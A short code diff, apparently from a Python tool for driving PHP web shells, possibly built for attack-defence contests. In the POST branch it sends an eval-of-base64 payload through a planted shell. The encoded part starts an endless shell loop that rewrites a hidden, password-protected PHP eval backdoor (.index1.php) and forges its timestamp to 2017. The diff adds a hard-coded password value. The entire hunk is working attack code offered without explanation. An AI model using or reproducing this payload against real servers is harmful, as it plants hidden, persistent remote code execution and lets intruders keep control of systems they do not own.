@@ -57,6 +57,7 @@ def cmd(url,method,passwd):
 		except :
 			pass
 	elif method=='post':
+		data['pass']="Sn3rtf4ck"
 		data[passwd]='@eval(base64_decode($_POST[z0]));'
 		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9QT1NUW3Bhc3NdKT09IjNhNTAwNjVlMTcwOWFjYzQ3YmEwYzkyMzgyOTQzNjRmIil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+XCcgPi5pbmRleDEucGhwO3RvdWNoIC1tIC1kICIyMDE3LTExLTE3IDEwOjIxOjI2IiAuaW5kZXgxLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
 		try:
